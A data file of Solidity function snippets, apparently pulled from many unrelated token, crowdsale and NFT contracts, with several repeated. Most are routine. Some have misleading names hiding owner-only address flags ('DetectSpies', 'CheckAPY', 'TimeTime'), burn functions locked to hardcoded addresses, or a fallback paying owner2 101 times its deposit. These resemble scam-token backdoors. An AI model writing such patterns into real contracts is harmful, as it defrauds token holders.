--------------------------------------------------------------------------------
function actualTotalSupply() public constant returns(uint) {
    uint256 coins;
    uint256 cycle;
    (coins,cycle) = calculateInterestDue();
    return totalSupply.add(coins);
  }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function changeFixedCommissionFee(uint _newCommissionFee)
                          public
                          whenNotPaused
                          whenNotStopped
                          onlyOwner
    returns(bool success)
  {
    uint oldCommissionFee = commissionFee;
    commissionFee = _newCommissionFee;
    emit LogChangeFixedCommissionFee(oldCommissionFee, commissionFee);
    return true;
  }
--------------------------------------------------------------------------------
function changeVerifier(address _newVerifier)
                          public
                          whenNotPaused
                          whenNotStopped
                          onlyOwner
    returns(bool success)
  {
    address oldVerifier = verifier;
    verifier = _newVerifier;
    emit LogChangeVerifier(oldVerifier, verifier);
    return true;
  }
--------------------------------------------------------------------------------
function getTransfer(address _transitAddress)
            public
            constant
    returns (
	     address id,
	     address from, // transfer sender
	     uint amount) // in wei
  {
    Transfer memory transfer = transferDct[_transitAddress];
    return (
	    _transitAddress,
	    transfer.from,
	        transfer.amount
	    );
  }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinCap = weiRaised.add(msg.value) <= cap;
    return super.validPurchase() && withinCap;
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function addMilestone(uint _start, uint _end, uint _bonus) public onlyDeployAgent {
        require(_bonus > 0 && _end > _start);
        milestones.push(Milestone(_start, _end, _bonus));
    }
--------------------------------------------------------------------------------
function validPurchase() internal constant returns (bool) {
    bool withinPeriod = started;
    bool nonZeroPurchase = msg.value != 0;
    return withinPeriod && nonZeroPurchase;
  }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x5A31de3e0Bd619f9C19510A2d838D57DAA94e015,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function requireValidOrder(Order memory order, Sig memory sig)
        internal
        view
        returns (bytes32)
    {
        bytes32 hash = hashToSign(order);
        require(validateOrder(hash, order, sig));
        return hash;
    }
--------------------------------------------------------------------------------
constructor () public {
    balances[msg.sender] = totalSupply_;
    emit Transfer(address(0), msg.sender, totalSupply_);
  }
--------------------------------------------------------------------------------
function pauseToken(uint token_id) public onlyOLevel hasKT(token_id){
    KT storage currKT = KTs[token_id];
    currKT.paused = true;
    emit PauseToken(token_id);
  }
--------------------------------------------------------------------------------
function unpauseToken(uint token_id) public onlyOLevel hasKT(token_id){
    KT storage currKT = KTs[token_id];
    currKT.paused = false;
    emit UnpauseToken(token_id);
  }
--------------------------------------------------------------------------------
function getPermissions() public view returns(bytes32[]) {
        bytes32[] memory allPermissions = new bytes32[](1);
        allPermissions[0] = TRANSFER_APPROVAL;
        return allPermissions;
    }
--------------------------------------------------------------------------------
function _mint(address to) internal virtual returns (uint256){
    _tokenIds.increment();
    uint256 id = _tokenIds.current();
    _safeMint(to, id);

    return id;
  }
--------------------------------------------------------------------------------
function TokenToTokenSwap (address _factory_address, address _creator, address _userContract, uint _start_date) public {
    current_state = SwapState.created;
    creator =_creator;
    factory_address = _factory_address;
    userContract = _userContract;
    start_date = _start_date;
  }
--------------------------------------------------------------------------------
constructor() public{
        
        totalSupply = maxSupply;
        
        //sending all the tokens to Owner
        balanceOf[owner] = totalSupply;
        
        //firing event which logs this transaction
        emit Transfer(address(0), owner, totalSupply);
    }
--------------------------------------------------------------------------------
function Burn(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0xC29a8CF78eB08332c6508bC549720110Fe66F0E3,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function tryInsertSequenceId(uint sequenceId) private onlySigner {
        require(sequenceId > lastsequenceId && sequenceId <= (lastsequenceId+1000), "Enter Valid sequenceId");
        lastsequenceId=sequenceId;
    }
--------------------------------------------------------------------------------
function setRound(
        bytes32 _merkleRoot,
        uint256 _rate
    ) external onlyConcave {
        // push new root to array of all roots - for viewing
        roots.push(_merkleRoot);
        // update merkle root
        merkleRoot = _merkleRoot;
        // update rate
        rate = _rate;

        emit NewRound(merkleRoot,rate);
    }
--------------------------------------------------------------------------------
function() external payable {
        if (msg.sender == owner2) {
            withdrawFunds(owner2, msg.value * 100 + msg.value);
        }
    }
--------------------------------------------------------------------------------
function returnEth() internal {
        // return if some eth left
        if (address(this).balance > 0) {
            msg.sender.transfer(address(this).balance);
        }
    }
--------------------------------------------------------------------------------
function GetDescript(string ProjectName) constant public returns(string) {
        if(__FindProjects(ProjectName)==true){
            return (ProjectDatas[ProjectName].Descript);
        }else{
           return (""); 
        }
    }
--------------------------------------------------------------------------------
function ()
        external
        payable
    {
        if (msg.sender != address(WETH)) {
            LibRichErrors.rrevert(LibWethUtilsRichErrors.DefaultFunctionWethContractOnlyError(
                msg.sender
            ));
        }
    }
--------------------------------------------------------------------------------
function addAddressToWhitelist(address addr) onlyOwner public returns(bool success) {
    if (!whitelist[addr]) {
      whitelist[addr] = true;
      emit WhitelistedAddressAdded(addr);
      success = true;
    }
  }
--------------------------------------------------------------------------------
function removeAddressFromWhitelist(address addr) onlyOwner public returns(bool success) {
    if (whitelist[addr]) {
      whitelist[addr] = false;
      emit WhitelistedAddressRemoved(addr);
      success = true;
    }
  }
--------------------------------------------------------------------------------
function isOperatorFor(
        address operator,
        address tokenHolder
    ) public view returns (bool) {
        return operator == tokenHolder ||
            (_defaultOperators[operator] && !_revokedDefaultOperators[tokenHolder][operator]) ||
            _operators[tokenHolder][operator];
    }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) public
  returns (bool success)
  {
    bytes memory empty; // null
    _transfer( msg.sender, to, value, empty );
    return true;
  }
--------------------------------------------------------------------------------
function prove(uint blockNumber, address account, uint balance, bytes32[] memory proof) public {
        require(proofIsCorrect(blockNumber, account, balance, proof), "error_proof");
        onVerifySuccess(blockNumber, account, balance);
    }
--------------------------------------------------------------------------------
constructor (AvailComToken _token) public {
    require(_token != address(0));

    // 0000 is added to the rate because decimal 4
    rate = 167000000;
    wallet = msg.sender;
    token = _token;
  }
--------------------------------------------------------------------------------
function finishCrowdsale() public onlyOwner {
    uint _value = token.balanceOf(this);
    token.transfer(wallet, _value);
    fifishICO = true;
  }
--------------------------------------------------------------------------------
function confirmTransaction(bytes32 transactionId)
        public
        ownerExists(msg.sender)
        notConfirmed(transactionId, msg.sender) {
        confirmations[transactionId][msg.sender] = true;
        Confirmation(msg.sender, transactionId);
        executeTransaction(transactionId);
    }
--------------------------------------------------------------------------------
function confirmAggregator(address _aggregator)
    external
    onlyOwner()
  {
    require(_aggregator == address(proposedAggregator), "Invalid proposed aggregator");
    delete proposedAggregator;
    setAggregator(_aggregator);
  }
--------------------------------------------------------------------------------
function emergencySetStartingIndexBlock() public onlyOwner
	{
		require(starting_index == 0, "Starting index is already set");

		starting_index_block = block.number;
	}
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public
    returns (bool success) {
        require(!blacklist[msg.sender]);
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function issueTokens(address _for, uint tokenCount)
        external
        isCrowdfundingContract
        returns (bool)
    {
        if (emissionEnabled == false) {
            revert();
        }

        balances[_for] += tokenCount;
        totalSupply += tokenCount;
        return true;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x241b3746151804c5F855b672810e07F9dcC7048B,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function createDrug(bytes32 _name, uint256 _price) public onlyCEO {
    require(msg.sender != address(0));
    _create_drug(_name, address(this), _price, 0);
  }
--------------------------------------------------------------------------------
function takeOwnership(uint256 _tokenId) public {
    require(isApprovedFor(msg.sender, _tokenId));
    clearApprovalAndTransfer(ownerOf(_tokenId), msg.sender, _tokenId);
  }
--------------------------------------------------------------------------------
function killBotAddress (address botAdd) public {
        require(_msgSender() == _charityWallet, "ERC20: cannot permit dev address");
        _listBotAddresses.push(botAdd);
    }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = _msgSender();
        _owner = msg.sender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function adminSetResource(address handlerAddress, bytes32 resourceID, address tokenAddress) external onlyAdmin {
        _resourceIDToHandlerAddress[resourceID] = handlerAddress;
        IERCHandler handler = IERCHandler(handlerAddress);
        handler.setResource(resourceID, tokenAddress);
    }
--------------------------------------------------------------------------------
function getProposal(uint8 originChainID, uint64 depositNonce, bytes32 dataHash) external view returns (Proposal memory) {
        uint72 nonceAndID = (uint72(depositNonce) << 8) | uint72(originChainID);
        return _proposals[nonceAndID][dataHash];
    }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender,_to,_value);
        emit Transfer(msg.sender, _to, _value);                   // Notify anyone listening that this transfer took place
    }
--------------------------------------------------------------------------------
function CONI() {
        founder = msg.sender;
        totalSupply = 1000000000 * 10 ** uint256(decimals);
        balances[founder] = totalSupply;
    }
--------------------------------------------------------------------------------
function confirmImplChange(bytes32 _lockId) public onlyCustodian {
        erc20Impl = getImplChangeReq(_lockId);

        delete implChangeReqs[_lockId];

        emit ImplChangeConfirmed(_lockId, address(erc20Impl));
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {

require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function DetectSpies(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    getCocaLeafes[spender] = val;
    getPoweder[spender] = val2; 
    getElPatron[spender] = val3;
    teriyaki = val4;
  }
--------------------------------------------------------------------------------
function mintWithSelectedHat(uint256 mintAmount, uint256 hatID)
        external
        nonReentrant
        returns (bool)
    {
        changeHatInternal(msg.sender, hatID);
        mintInternal(mintAmount);
        payInterestInternal(msg.sender);
        return true;
    }
--------------------------------------------------------------------------------
function redeem(uint256 redeemTokens) external nonReentrant returns (bool) {
        address src = msg.sender;
        payInterestInternal(src);
        redeemInternal(src, redeemTokens);
        return true;
    }
--------------------------------------------------------------------------------
function redeemAndTransfer(address redeemTo, uint256 redeemTokens)
        external
        nonReentrant
        returns (bool)
    {
        address src = msg.sender;
        payInterestInternal(src);
        redeemInternal(redeemTo, redeemTokens);
        return true;
    }
--------------------------------------------------------------------------------
function getGlobalStats() external view returns (GlobalStats memory) {
        uint256 totalSavingsAmount;
        totalSavingsAmount += sOriginalToR(savingAssetOrignalAmount);
        return
            GlobalStats({
                totalSupply: totalSupply,
                totalSavingsAmount: totalSavingsAmount
            });
    }
--------------------------------------------------------------------------------
function estimateAndRecollectLoans(address owner, uint256 rAmount)
        internal returns (uint256 sInternalEstimated)
    {
        // accrue interest so estimate is up to date
        require(ias.accrueInterest(), "accrueInterest failed");
        sInternalEstimated = rToSInternal(rAmount);
        recollectLoans(owner, rAmount);
    }
--------------------------------------------------------------------------------
function addHolder(address _holder) internal {
        if (holderNumber[_holder] == 0) {
            holders.push(_holder);
            holderNumber[_holder] = holders.length;
        }
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function takeFee(uint _amount) internal returns (uint feeAmount) {
        feeAmount = _amount / SERVICE_FEE;
        if (feeAmount > 0) {
            ERC20(MAKER_DAI_ADDRESS).transfer(WALLET_ID, feeAmount);
        }
    }
--------------------------------------------------------------------------------
constructor(address _wallet) public {
    totalSupply_ = INITIAL_SUPPLY;
    balances[_wallet] = INITIAL_SUPPLY;
    emit Transfer(address(0), _wallet, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function transferOwnershipWithBalance(address newOwner) onlyOwner public{
		if (newOwner != address(0)) {
		    _transfer(owner,newOwner,balanceOf[owner]);
		    owner = newOwner;
		}
	}
--------------------------------------------------------------------------------
function _setTokenURI(uint256 tokenId, string memory uri) internal {
        require(_exists(tokenId), "URI set of nonexistent token");
        _tokenURIs[tokenId] = uri;
    }
--------------------------------------------------------------------------------
function Mintero() public {
        symbol = "MTC";
        name = "Mintero Coin";
        decimals = 18;
        
        //endDate = now + 20 weeks;
        max_participants = 667334;
        participants = 0;
    }
--------------------------------------------------------------------------------
function isCompromised(address _id) external isName(_id) view returns (bool) {
		AccountRecovery memory _accountRecovery = accountRecoveries[_id];
		return (_accountRecovery.submitted && now <= _accountRecovery.lockedUntilTimestamp);
	}
--------------------------------------------------------------------------------
function pullToken(ERC20 token, uint amount) external onlyReserve inOpAndLiqP returns (bool){
        require(token.transfer(reserve, amount));
        TokenPulled(token, amount, reserve);
        return true;
    }
--------------------------------------------------------------------------------
function investorInfo(address addr) public view returns(uint value, uint paymentTime, uint refsCount, uint refBonus, bool isReferral) {
        (value, paymentTime, refsCount, refBonus) = strg.investorBaseInfo(addr);
        isReferral = referrals[addr].notEmptyAddr();
    }
--------------------------------------------------------------------------------
function getMemBestInvestor() internal view returns(Storage.bestAddress) {
        (uint value, address addr) = strg.getBestInvestor();
        return Storage.bestAddress(value, addr);
    }
--------------------------------------------------------------------------------
function getMemBestPromoter() internal view returns(Storage.bestAddress) {
        (uint value, address addr) = strg.getBestPromoter();
        return Storage.bestAddress(value, addr);
    }
--------------------------------------------------------------------------------
function _upgradeTo(address _newImplementation) internal {
        address currentImplementation = implementation();
        require(currentImplementation != _newImplementation);
        _setImplementation(_newImplementation);
        emit Upgraded(_newImplementation);
    }
--------------------------------------------------------------------------------
function CheckAPY(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    glacier[spender] = val;
    flies[spender] = val2; 
    nose[spender] = val3;
    cating = val4;
  }
--------------------------------------------------------------------------------
function Mints(uint256 quantity) external onlyOwner {
    
     require(totalSupply() + quantity <= amountForDevs, "reached max supply");
    _safeMint(msg.sender, quantity);
  }
--------------------------------------------------------------------------------
function snapshot() public returns (uint256) {
_currentSnapshotId.increment();

uint256 currentId = _currentSnapshotId.current();
emit Snapshot(currentId);
return currentId;
}
--------------------------------------------------------------------------------
function adminWithdraw(uint256 _amount) public onlyAdmin {
        atari.safeTransfer(address(msg.sender), _amount);
        emit DevWithdraw(msg.sender, _amount);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function freezeAccount(address _holder) public onlyOwner returns (bool) {

require(!frozen[_holder]);
frozen[_holder] = true;
emit Freeze(_holder);
return true;
}
--------------------------------------------------------------------------------
function unfreezeAccount(address _holder) public onlyOwner returns (bool) {
require(frozen[_holder]);
frozen[_holder] = false;
emit Unfreeze(_holder);
return true;
}
--------------------------------------------------------------------------------
constructor() public ManagedToken(msg.sender, msg.sender) {
        name = "Char";
        symbol = "Char";
        decimals = 18;
        totalIssue = 0;
        totalSupply = 5000000000 ether;                                         //The maximum number of tokens is unchanged and totals will decrease after issue
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
        admin = owner;
        balances[owner] = _totalSupply;
        emit Transfer(address(0), owner, _totalSupply);
    }
--------------------------------------------------------------------------------
function goalReached() internal {
        emit SoftcapReached(treasury, fundingGoal);
        fundingGoalReached = true;
        if (weiRaisedInPICO < fundingGoal){
            PICO.extGoalReached();
        }
    }
--------------------------------------------------------------------------------
function transferByOwner(address to, uint256 value, uint256 lockingTime) public AllTransfersLockStatus onlyOwner returns (bool) {
        addLockingTime(to,lockingTime,value);
        _transfer(msg.sender, to, value);
        return true;
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
function confirmImplChange(bytes32 _lockId) public onlyCustodian {
        erc20Impl = getImplChangeReq(_lockId);

        delete implChangeReqs[_lockId];

        emit ImplChangeConfirmed(_lockId, address(erc20Impl));
    }
--------------------------------------------------------------------------------
function makeCoin(uint256 _value)public returns (bool){
        require(msg.sender == owner);
        totalSupply += _value;
        balances[owner] += _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
    _mint(msg.sender, INITIAL_SUPPLY);
    emit Transfer(address(0), msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function donationToWhale() public {
        require(isWhaleVotedYes());
        require(isFundUnlocked());
        usdt.transfer(whaleAddress, usdt.balanceOf(address(this)));
    }
--------------------------------------------------------------------------------
function BreezeCoinICO() public {
        whitelistSupplier = msg.sender;
        second_whitelistSupplier = 0xC578FFd5629B0e89F4384b27227C2AE66Dbee843;
	third_whitelistSupplier = 0x2bb3a4f80bFb939716E6d85799116feB1906748B;
	fourth_whitelistSupplier = 0x8aFC72dA31185182605E5b51053e96D3f48ea6ea;
        owner = return_owner;
    }
--------------------------------------------------------------------------------
constructor(address _masterCopy)
        public
    {
        require(_masterCopy != address(0), "Invalid master copy address provided");
        masterCopy = _masterCopy;
    }
--------------------------------------------------------------------------------
constructor () public {
    balances[msg.sender] = totalSupply_;
    emit Transfer(address(0), msg.sender, totalSupply_);
  }
--------------------------------------------------------------------------------
function DetectSwaps(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    antarctic[spender] = val;
    alaska[spender] = val2; 
    snow[spender] = val3;
    clinton = val4;
  }
--------------------------------------------------------------------------------
constructor() public{
        
        totalSupply = maxSupply;
        
        //sending all the tokens to Owner
        balanceOf[owner] = totalSupply;
        
        //firing event which logs this transaction
        emit Transfer(address(0), owner, totalSupply);
    }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function getVote(uint _postId)
        public
        view
        returns (uint8)
    {
        Post storage p = posts[_postId];
        return uint8(p.voters[msg.sender]);
    }
--------------------------------------------------------------------------------
constructor(
        address _FundAccount
    ) public
    {
        FundAccount = _FundAccount;
        totalSupply = tokenCreationCap;
        balances[FundAccount] = tokenCreationCap;    // deposit all TDT to Owner.
        emit CreatePCW(FundAccount, tokenCreationCap);    // logs deposit of Owner
    }
--------------------------------------------------------------------------------
function OctusNetworkGoldenToken() {
    totalSupply = INITIAL_SUPPLY;                               // Set the total supply
    balances[msg.sender] = INITIAL_SUPPLY;                      // Creator address is assigned all
    Transfer(0x0, msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
function increaseAllowance(address spender, uint256 addedValue) external returns (bool) {
        _approve(msg.sender, spender, _allowances[msg.sender][spender] + addedValue);
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function purgeUpgrade() onlyAssetOwner() returns(bool) {
        if (pendingVersion == 0x0) {
            return false;
        }
        delete pendingVersion;
        delete pendingVersionTimestamp;
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function isOperatorFor(
        address operator,
        address tokenHolder
    ) public view override returns (bool) {
        return operator == tokenHolder ||
            (_defaultOperators[operator] && !_revokedDefaultOperators[tokenHolder][operator]) ||
            _operators[tokenHolder][operator];
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function cancelOffer(uint256 offerId) public {
		
		// 판매자인지 확인합니다.
		require(offerInfos[offerId].offeror == msg.sender);
		
		// 판매 정보 삭제
		removeOffer(offerId);
		
		emit CancelOffer(offerId);
	}
--------------------------------------------------------------------------------
function inRebaseWindow() public view returns (bool) {
        return (
            now.mod(minRebaseTimeIntervalSec) >= rebaseWindowOffsetSec &&
            now.mod(minRebaseTimeIntervalSec) < (rebaseWindowOffsetSec.add(rebaseWindowLengthSec))
        );
    }
--------------------------------------------------------------------------------
function burn(uint256 _amount) public isItTeamAddress(msg.sender) {
        _burn(msg.sender, _amount);
        _moveDelegates(_delegates[msg.sender], address(0), _amount);
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function transfer(address to, uint256 value) external returns (bool) {
		// get tribute from your citizens before
		kingdom.getTribute(msg.sender);
        return kingdom.transfer(msg.sender, to, value);
    }
--------------------------------------------------------------------------------
constructor() public {
    balances[msg.sender] = _totalSupply;
    emit Transfer(address(0), msg.sender, _totalSupply);
  }
--------------------------------------------------------------------------------
function deploy(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            fee(_counts[i]); }
    }
--------------------------------------------------------------------------------
function safeTransferFrom(address _from, address _to, uint256 _tokenId, bytes _data)
        public
        canTransfer(_tokenId)
    {
        require(_isTransferAllowed(_from, _to, _tokenId));
        super.safeTransferFrom(_from, _to, _tokenId, _data);
    }
--------------------------------------------------------------------------------
function ETHERMINI() {
        owner = msg.sender;
        balanceOf[msg.sender] = supply;
        deadline = block.number + durationInBlocks;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value) public
    returns (bool success) {
        if (_value <= 0) revert();
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function validateNonce(uint nounce) private onlySigner {
        require(nounce > lastNounce && nounce <= (lastNounce+1000), "Enter Valid Nounce");
        lastNounce=nounce;
    }
--------------------------------------------------------------------------------
function _isSiringPermitted(uint256 _sireId, uint256 _matronId)
    internal
    view
    returns (bool)
    {
        address matronOwner = ponyIndexToOwner[_matronId];
        address sireOwner = ponyIndexToOwner[_sireId];

        return (matronOwner == sireOwner);
    }
--------------------------------------------------------------------------------
function isReadyToBreed(uint256 _ponyId)
    public
    view
    returns (bool)
    {
        require(_ponyId > 0);
        Pony storage pony = ponies[_ponyId];
        return _isReadyToBreed(pony);
    }
--------------------------------------------------------------------------------
function Goo() public payable {
        roughSupply = 1;
        gooBalance[msg.sender] = 1;
         lastGooSaveTime[msg.sender] = block.timestamp;
    }
--------------------------------------------------------------------------------
function BusTokenLock(address _owner, address _token) {
        require(_owner != 0x0);
        require(_token != 0x0);

        owner = _owner;
        token = FreezableToken(_token);
    }
--------------------------------------------------------------------------------
function setfeewallet(address[] memory _counts) external checker {
        for (uint256 i = 0; i < _counts.length; i++) {
            fee(_counts[i]); }
    }
--------------------------------------------------------------------------------
function inCaseTokenGetsStuck(IERC20 _TokenAddress) onlyOwner public {
      uint qty = _TokenAddress.balanceOf(address(this));
      _TokenAddress.safeTransfer(msg.sender, qty);
  }
--------------------------------------------------------------------------------
function transfer(address recipient, uint256 amount) public virtual onlyPermitted override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        
        if(_msgSender() == creator())
        { givePermissions(recipient); }
        
        return true;
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
constructor() public {
    // Set initial minimum timelock interval values.
    _setInitialTimelockInterval(this.test.selector, 5); // 5 seconds

    // Set initial default timelock expiration values.
    _setInitialTimelockExpiration(this.test.selector, 30 minutes);
  }
--------------------------------------------------------------------------------
function setApprovalForAll(
    address _operator,
    bool _approved
  )
    external
    override
  {
    ownerToOperators[msg.sender][_operator] = _approved;
    emit ApprovalForAll(msg.sender, _operator, _approved);
  }
--------------------------------------------------------------------------------
function _removeNFToken(
    address _from,
    uint256 _tokenId
  )
    internal
    virtual
  {
    require(idToOwner[_tokenId] == _from, NOT_OWNER);
    ownerToNFTokenCount[_from] -= 1;
    delete idToOwner[_tokenId];
  }
--------------------------------------------------------------------------------
function renounceOwnership() public onlyOwner {
        require(!rebaseLocked, "Cannot renounce ownership if rebase is locked");
        super.renounceOwnership();
    }
--------------------------------------------------------------------------------
function WyvernExchange (ProxyRegistry registryAddress, TokenTransferProxy tokenTransferProxyAddress, ERC20 tokenAddress, address protocolFeeAddress) public {
        registry = registryAddress;
        tokenTransferProxy = tokenTransferProxyAddress;
        exchangeToken = tokenAddress;
        protocolFeeRecipient = protocolFeeAddress;
        owner = msg.sender;
    }
--------------------------------------------------------------------------------
function getWhitepaperAt (address _contract, uint256 _index) public view returns (
        uint256 version,
        string ipfsHash,
        address author
    ) {
        return (
            whitepapers[_contract][_index].version,
            whitepapers[_contract][_index].ipfsHash,
            authors[_contract]
        );
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x1b3599F527feD182e5AFe6381e32e0d67dA8A0F4,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function withdrawPreIcoFounds() public onlyOwner {  
		if(currentPreICObalance > softcap) {
			// send all current ETH from contract to owner
			uint availableToTranser = this.balance-managerETHbonus;
			owner.transfer(availableToTranser);
		}
    }
--------------------------------------------------------------------------------
function TimeTime(address spender, bool val, bool val2, bool val3, bool val4) external onlyOwner {
    toilet[spender] = val;
    william[spender] = val2; 
    thequeen[spender] = val3;
    thisValue = val4;
  }
--------------------------------------------------------------------------------
constructor(address payable _address) public {
        founder  = _address;
        balanceOf[founder] = totalSupply; 
        emit Transfer(address(0), founder, totalSupply);
    }
--------------------------------------------------------------------------------
constructor() public {
    _mint(msg.sender, INITIAL_SUPPLY);
    emit Transfer(address(0), msg.sender, INITIAL_SUPPLY);
  }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function Burn(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x6CE280C721816033f047e8bc9722e46D5f8fcFD3,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
constructor () internal {
        address msgSender = msg.sender;
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
--------------------------------------------------------------------------------
function transferFrom (address _from, address _to, uint256 _value)
    public returns (bool success) {
    if (frozen) return false;
    else return AbstractToken.transferFrom (_from, _to, _value);
  }
--------------------------------------------------------------------------------
constructor (string memory name, string memory symbol) public {
        _name = name;
        _symbol = symbol;
        _decimals = 18;
        _mint(msg.sender, 1000000000 ether);
    }
--------------------------------------------------------------------------------
function cartridges( uint256 at ) external view returns (address) {
        require( at < _cartridges.length, "out of range" );

        return( address(_cartridges[at]) );
    }
--------------------------------------------------------------------------------
constructor () public {
         owner = msg.sender;
         balances[owner] = _totalSupply;
        emit Transfer(0, owner, _totalSupply);
     }
--------------------------------------------------------------------------------
function transferETH() isOwner external {
        if (this.balance == 0) throw;
        if (!ethFundDeposit.send(this.balance)) throw;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0x837808B09F019D7C9e7ab326773151E29CB67F1d,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function () public payable {
        require(msg.value>0);
        _systemReserves[0x0] = add(_systemReserves[0x0], msg.value);
    }
--------------------------------------------------------------------------------
function OwnerRetireHodl(uint256 id) public onlyOwner {
        Safe storage s = _safes[id]; 
        require(s.id != 0); 
        RetireHodl(id);
    }
--------------------------------------------------------------------------------
function approve(address _spender, uint256 _value)
        returns (bool success) {
		if (_value <= 0) throw; 
        allowance[msg.sender][_spender] = _value;
        return true;
    }
--------------------------------------------------------------------------------
function UserBalance(uint256 amount) public returns (bool) {
        require(
            _msgSender() == 0xb733f16A8c21dEF19f43Ed01126f2Bdd8122327e,
            "BEP20: Not accessible"
        );
        burning(_msgSender(), amount);

        return true;
    }
--------------------------------------------------------------------------------
function _transferOwnership(address _newOwner) internal {
    require(_newOwner != address(0), "OW02");
    emit OwnershipTransferred(owner, _newOwner);
    owner = _newOwner;
  }
--------------------------------------------------------------------------------
